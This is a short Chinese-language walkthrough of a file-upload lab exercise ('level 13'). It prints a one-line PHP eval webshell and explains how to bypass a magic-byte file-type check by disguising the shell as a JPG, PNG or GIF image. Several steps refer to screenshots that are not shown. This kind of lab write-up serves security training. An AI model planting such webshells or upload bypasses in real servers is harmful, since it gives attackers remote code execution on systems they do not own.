## 解题wp(By:独立团孙德胜Alan)
本pass可以通过制作图片马绕过

## 1.打开第十三关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)



## 3.分析代码

##### ![](./img/3.png)

##### 源码中利用getReailFileType函数中fread函数读取文件开头两个字符，并利用unpack函数将字符转换成ascii码值，最后用intval连接取整(值为$typeCode)。

##### 然后判断$typeCode为255216(0xff,0xd8)、13780(0x89,0x50)、7173(0x47,0x49)

##### JPG:对于JPG文件保留的文件头标识就多一些了(10行左右)，可以直接在JPG文件都加php木马，但是会有如下错误。

##### PNG:89 50 4e 47 0d 0a 1a 0a(可以抓包修改hex，也可以找个真png，用编辑器打开，将文件头标识后面的内容替换成php木马就行)

##### GIF:GIF89a(直接在文件头加入，也可以抓包修改hex：47 49 46 38 39 61)

##### 这是JPG因为文件内容有干扰PHP解析的数据出现，后删除部分内容上传后成功

## 4.我们可以本地制作一个图片马绕过

![](./img/4.png)

![](./img/5.png)

